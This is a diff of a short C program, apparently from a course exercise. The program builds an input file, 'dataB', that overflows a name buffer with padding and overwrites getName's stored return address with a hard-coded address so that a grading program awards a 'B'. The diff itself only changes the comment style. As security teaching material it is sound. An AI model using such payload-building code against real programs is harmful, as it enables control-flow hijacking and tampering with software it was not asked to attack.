@@ -24,19 +24,19 @@ int main(void) {
     int i;
 
     psFile = fopen("dataB", "wb");
-    fprintf(psFile, "Josh Song"); // prints name bytes
-    putc('\0', psFile); // prints nullbyte
+    fprintf(psFile, "Josh Song"); /* prints name bytes */
+    putc('\0', psFile); /* prints nullbyte */
 
-    for (i = 9; i < 80; i++) { // prints padding to overrun stack
+    for (i = 9; i < 80; i++) { /* prints padding to overrun stack */
         putc('A', psFile);
     }
 
-    // writes address of instruction in main to get a B, which will
-    // overwrite getName's stored return address
+    /* writes address of instruction in main to get a B, which will
+       overwrite getName's stored return address */
     ulAddr = 0x400890;
     fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);
 
-    putc('\n', psFile); // prints newline
+    putc('\n', psFile); /* prints newline */
     fclose(psFile);
 
     return 0;
